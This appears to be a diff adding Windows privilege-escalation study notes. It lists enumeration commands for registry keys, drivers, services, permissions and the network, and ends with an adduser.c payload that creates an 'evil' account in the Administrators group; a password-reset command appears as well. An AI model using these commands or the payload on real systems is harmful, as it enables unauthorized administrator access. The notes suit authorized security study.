@@ -1,0 +1,108 @@
+#!/usr/bin/peno
+
+#Getting the version and architecture of the running operating system
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+#Querying the AlwaysInstalledElevated registry values on Windows
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+#Checking the Group Integrity Level
+whoami /groups
+
+#Attempting to change the password
+net user admin Ev!lpass
+
+#Using powershell to spawn a cmd.exe process with high integrity
+powershell.exe Start-Process cmd.exe -Verb runAs
+
+#Listing driver versions on Windows
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+
+#Listing loaded drivers on Windows
+PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+
+#Listing all drives available to mount on Windows
+mountvol
+
+#Checking for reboot and other privileges
+whoami /priv
+
+#Rebooting the machine
+shutdown /r /t 0
+
+#Listing all installed drivers
+driverquery /v
+
+#Listing all writable files and directories in a specified target using PowerShell
+PS > Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+
+#Listing all writable files and directories in a specified target
+accesschk.exe -uws "Everyone" "C:\Program Files"
+
+#Listing all installed security patches on Windows
+wmic qfe get Caption, Description, HotFixID, InstalledOn
+
+#Listing all installed applications installed on Windows
+wmic product get name, version, vendor
+
+#Listing running services on Windows using PowerShell
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+
+#Listing all the scheduled tasks on Windows
+schtasks /query /fo LIST /v
+
+# icacls output for the ServiioService.exe service
+icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+#Listing all the firewall rules on Windows
+netsh advfirewall firewall show rule name=all
+
+#Listing the current profile for the firewall on Windows
+netsh advfirewall show currentprofile
+
+#Listing all active network connections on the Windows operating system
+netstat -ano
+
+#Printing the routes on Windows
+route print
+
+#Listing the full TCP/IP configuration on all available adapters on Windows
+ipconfig /all
+
+#Getting a list of running processes on the operating system and matching services
+tasklist /SVC
+
+#Tools
+#https://github.com/pentestmonkey/windows-privesc-check
+windows-privesc-check2.exe -h
+windows-privesc-check2.exe --dump -G
+
+#Tools
+#Checking the application manifest of fodhelper.exe using sigcheck.exe
+SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+
+
+#Tools
+#gcc for windows with
+mingw-w64.bat
+gcc --help
+
+
+#Code
+#adduser.c code
+#i686-w64-mingw32-gcc adduser.c -o adduser.exe
+
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user evil Ev!lpass /add");
+  i = system ("net localgroup administrators evil /add");
+  
+  return 0;
+}
+
+
